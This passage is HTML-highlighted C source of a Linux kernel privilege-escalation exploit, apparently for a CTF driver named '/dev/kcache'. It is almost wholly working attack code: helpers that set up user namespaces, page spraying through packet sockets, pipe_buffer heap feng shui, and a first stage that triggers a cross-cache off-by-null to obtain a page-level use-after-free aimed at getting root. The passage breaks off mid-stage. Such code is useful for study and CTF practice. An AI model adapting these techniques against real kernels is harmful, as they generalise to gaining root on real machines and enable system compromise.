class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief create an isolate namespace</span><br><span class="hljs-comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span><br><span class="hljs-comment"> * to perform basic exploiting operations in it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment"> * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment"> * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment"> * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment"> * error.  If not present all pages are considered good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment"> * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment"> * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment"> * most often used case is insertion into different file address space</span><br><span class="hljs-comment"> * cache.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to the pipe buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_NUM 0x10</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_ALLOC 0x114</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_APPEND 0x514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_READ 0x1919</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_FREE 0x810</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_append</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_read</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>        .sz = size,<br>        .buf = buf,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kcache_free</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kcache_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .idx = index,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * III -  pgv pages sprayer related </span><br><span class="hljs-comment"> * not that we should create two process:</span><br><span class="hljs-comment"> * - the parent is the one to send cmd and get root</span><br><span class="hljs-comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span><br><span class="hljs-comment"> *      receiving cmd from parent and operates it only</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_PAGE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr;<br>&#125;;<br><br><span class="hljs-comment">/* operations type */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_PAGE,<br>    CMD_FREE_PAGE,<br>    CMD_EXIT,<br>&#125;;<br><br><span class="hljs-comment">/* tpacket version for setsockopt */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-comment">/* pipe for cmd communication */</span><br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>];<br><br><span class="hljs-comment">/* create a socket and alloc pages, return the socket fd */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of allocation to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_ALLOC_PAGE,<br>        .size = size,<br>        .nr = nr,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv_page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the parent process should call it to send command of freeing to child */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    usleep(<span class="hljs-number">10000</span>);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* the child, handler for commands from the pipe */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv_page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_PAGE_NUM];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    unshare_setup();<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;<br>            ret = create_socket_and_alloc_pages(req.size, req.nr);<br>            socket_fd[req.idx] = ret;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;<br>            ret = close(socket_fd[req.idx]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != CMD_EXIT);<br>&#125;<br><br><span class="hljs-comment">/* init pgv-exploit subsystem :) */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* pipe for pgv */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <br>    <span class="hljs-comment">/* child process for pages spray */</span><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * IV - config for page-level heap spray and heap fengshui</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM 200</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span><br><br><span class="hljs-type">int</span> pgv_1page_start_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;<br><span class="hljs-type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;<br><br><span class="hljs-comment">/* spray pages in different size for various usages */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pgv_pages</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * We want a more clear and continuous memory there, which require us to </span><br><span class="hljs-comment">     * make the noise less in allocating order-3 pages.</span><br><span class="hljs-comment">     * So we pre-allocate the pages for those noisy objects there.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-0 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(i, <span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-2 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray 8 pages for page-level heap fengshui */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pgv order-3 pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">19</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_4pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">21</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">512</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_1page_start_idx += <span class="hljs-number">2</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> orig_pid = <span class="hljs-number">-1</span>, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">extend_pipe_buffer_to_4k</span><span class="hljs-params">(<span class="hljs-type">int</span> start_idx, <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr; i++) &#123;<br>        <span class="hljs-comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span><br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>            free_page(pgv_8pages_start_idx++);<br>        &#125;<br><br>        <span class="hljs-comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;<br><br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(<span class="hljs-number">0</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);<br>    free_page(pgv_8pages_start_idx++);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_alloc(i, <span class="hljs-number">8</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="hljs-number">2</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-comment">/* try to trigger cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_append(i, KCACHE_SIZE - <span class="hljs-number">8</span>, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* checking for cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span 